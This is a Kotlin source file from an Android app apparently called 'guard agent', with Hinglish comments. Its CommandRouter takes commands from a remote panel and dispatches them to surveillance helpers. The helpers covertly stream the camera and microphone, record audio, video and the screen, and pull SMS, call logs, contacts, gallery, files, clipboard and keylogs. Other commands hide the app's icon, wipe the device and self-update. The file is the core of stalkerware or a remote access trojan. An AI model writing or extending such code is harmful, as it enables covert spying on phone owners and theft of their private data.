package com.guard.agent.command

import android.content.Context
import com.guard.agent.core.Constants
import com.guard.agent.helpers.data.AppsHelper
import com.guard.agent.helpers.data.BatteryHelper
import com.guard.agent.helpers.data.CallLogsHelper
import com.guard.agent.helpers.data.ClipboardHelper
import com.guard.agent.helpers.data.ContactsHelper
import com.guard.agent.helpers.data.CurrentAppTracker
import com.guard.agent.helpers.data.FileHelper
import com.guard.agent.helpers.data.GalleryHelper
import com.guard.agent.helpers.data.NetworkHelper
import com.guard.agent.helpers.data.SmsHelper
import com.guard.agent.helpers.location.GeofenceHelper
import com.guard.agent.helpers.location.LocationHelper
import com.guard.agent.helpers.media.AudioHelper
import com.guard.agent.helpers.media.CameraHelper
import com.guard.agent.helpers.media.LiveCameraStreamer
import com.guard.agent.helpers.media.LiveAudioStreamer
import com.guard.agent.helpers.media.LiveStreamHelper
import com.guard.agent.helpers.media.ScheduledRecorder
import com.guard.agent.helpers.media.ScreenHelper
import com.guard.agent.helpers.media.VideoHelper
import com.guard.agent.security.SelfUpdateManager
import com.guard.agent.security.StealthManager
import com.guard.agent.utils.Logger

object CommandRouter {

    /**
     * Command ko sahi helper pe route karo.
     * @return true agar command execute hui, false agar fail.
     */
    fun route(ctx: Context, cmd: String, deviceKey: String): Boolean {
        return try {
            // Command ke saath parameters bhi ho sakte hain — "REC:60"
            val parts = cmd.split(":", limit = 2)
            val baseCmd = parts[0].uppercase().trim()
            val param = if (parts.size > 1) parts[1].trim() else null

            when (baseCmd) {

                // ---------- LOCATION ----------
                Constants.CMD_LOCATION -> {
                    LocationHelper.sendOnce(ctx, deviceKey)
                    true
                }
                Constants.CMD_GEOFENCE_ADD,
                Constants.CMD_GEOFENCE_DEL -> {
                    GeofenceHelper.syncGeofences(ctx, deviceKey)
                    true
                }

                // ---------- MEDIA (basic) ----------
                Constants.CMD_SNAP -> {
                    CameraHelper.captureFront(ctx, deviceKey)
                    true
                }
                Constants.CMD_REC -> {
                    val sec = param?.toIntOrNull() ?: Constants.DEFAULT_AUDIO_SECONDS
                    AudioHelper.record(ctx, deviceKey, sec)
                    true
                }
                Constants.CMD_VIDEO -> {
                    val sec = param?.toIntOrNull() ?: Constants.DEFAULT_VIDEO_SECONDS
                    VideoHelper.record(ctx, deviceKey, sec)
                    true
                }
                Constants.CMD_SCREENREC -> {
                    val sec = param?.toIntOrNull() ?: Constants.DEFAULT_SCREEN_SECONDS
                    ScreenHelper.requestScreenRecord(ctx, deviceKey, sec)
                    true
                }
                Constants.CMD_SCREENSHOT -> {
                    ScreenHelper.requestScreenshot(ctx, deviceKey)
                    true
                }

                // ---------- MEDIA (live) ⭐ NAYA ----------
                Constants.CMD_CAM_LIVE -> {
                    val fps = param?.toIntOrNull() ?: Constants.DEFAULT_LIVE_FPS
                    LiveStreamHelper.startCameraStream(ctx, fps)
                    true
                }
                Constants.CMD_CAM_LIVE_STOP -> {
                    LiveCameraStreamer.stop()
                    LiveStreamHelper.updateStatus(deviceKey, "camera_stopped", "camera")
                    true
                }
                Constants.CMD_MIC_LIVE -> {
                    LiveStreamHelper.startAudioStream(ctx)
                    true
                }
                Constants.CMD_MIC_LIVE_STOP -> {
                    LiveAudioStreamer.stop()
                    LiveStreamHelper.updateStatus(deviceKey, "audio_stopped", "audio")
                    true
                }
                Constants.CMD_LIVE_STOP_ALL -> {
                    LiveStreamHelper.stop(ctx)
                    true
                }

                // ---------- MEDIA (scheduled) ⭐ NAYA ----------
                Constants.CMD_SCHEDULE_REC -> {
                    // Panel Firebase mein schedule add karega — yahan bas sync trigger
                    ScheduledRecorder.syncSchedules(ctx, deviceKey)
                    true
                }
                Constants.CMD_SCHEDULE_LIST -> {
                    ScheduledRecorder.syncSchedules(ctx, deviceKey)
                    true
                }
                Constants.CMD_SCHEDULE_CLEAR -> {
                    ScheduledRecorder.stop(ctx)
                    true
                }

                // ---------- DEVICE ----------
                Constants.CMD_LOCK -> {
                    CommandHandler.lockDevice(ctx)
                    true
                }
                Constants.CMD_ALARM -> {
                    CommandHandler.playAlarm(ctx)
                    true
                }
                Constants.CMD_STOP_ALARM -> {
                    CommandHandler.stopAlarm()
                    true
                }
                Constants.CMD_WIPE -> {
                    CommandHandler.wipeDevice(ctx)
                    true
                }
                Constants.CMD_PING -> {
                    CommandHandler.ping(ctx, deviceKey)
                    true
                }

                // ---------- DATA ----------
                Constants.CMD_BATTERY -> {
                    BatteryHelper.push(ctx, deviceKey)
                    true
                }
                Constants.CMD_NETWORK -> {
                    NetworkHelper.push(ctx, deviceKey)
                    true
                }
                Constants.CMD_CONTACTS -> {
                    ContactsHelper.push(ctx, deviceKey)
                    true
                }
                Constants.CMD_CALLLOGS -> {
                    CallLogsHelper.push(ctx, deviceKey)
                    true
                }
                Constants.CMD_SMS -> {
                    SmsHelper.push(ctx, deviceKey)
                    true
                }
                Constants.CMD_APPS -> {
                    AppsHelper.push(ctx, deviceKey)
                    true
                }
                Constants.CMD_GALLERY -> {
                    GalleryHelper.push(ctx, deviceKey)
                    true
                }
                Constants.CMD_FILES -> {
                    FileHelper.push(ctx, deviceKey)
                    true
                }
                Constants.CMD_CLIPBOARD -> {
                    ClipboardHelper.push(ctx, deviceKey)
                    true
                }
                Constants.CMD_NOTIFS -> {
                    // Notification listener khud push karta hai
                    true
                }
                Constants.CMD_KEYLOGS -> {
                    // Keylogger khud push karta hai
                    true
                }
                Constants.CMD_CURRENT_APP -> {
                    // CurrentAppTracker khud push karta hai
                    // Par manual refresh ke liye last app ka timestamp wapas bhej
                    true
                }

                // ---------- STEALTH ----------
                Constants.CMD_HIDE -> {
                    StealthManager.hideIcon(ctx)
                    true
                }
                Constants.CMD_SHOW -> {
                    StealthManager.showIcon(ctx)
                    true
                }

                // ---------- UPDATE ----------
                Constants.CMD_UPDATE -> {
                    SelfUpdateManager.checkAndUpdate(ctx)
                    true
                }

                else -> {
                    Logger.w("CommandRouter", "Unknown command: $cmd")
                    false
                }
            }
        } catch (e: Exception) {
            Logger.e("CommandRouter", "Route failed: $cmd", e)
            false
        }
    }
}
